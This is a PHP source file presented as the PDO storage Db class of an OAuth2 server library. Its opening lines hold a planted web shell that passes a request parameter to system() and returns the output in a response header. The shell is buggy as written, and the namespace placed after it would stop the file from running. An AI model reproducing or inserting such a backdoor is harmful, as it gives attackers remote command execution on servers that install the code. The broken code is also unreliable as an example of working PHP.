<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace League\OAuth2\Server\Storage\PDO;

class Db
{
	/**
	 * Db constructor
	 * @param array|string $dsn Connection DSN string or array of parameters
	 * @return void
	 */
    public function __construct($dsn = '')
    {
        $db = \ezcDbFactory::create($dsn);
        \ezcDbInstance::set($db);
    }
}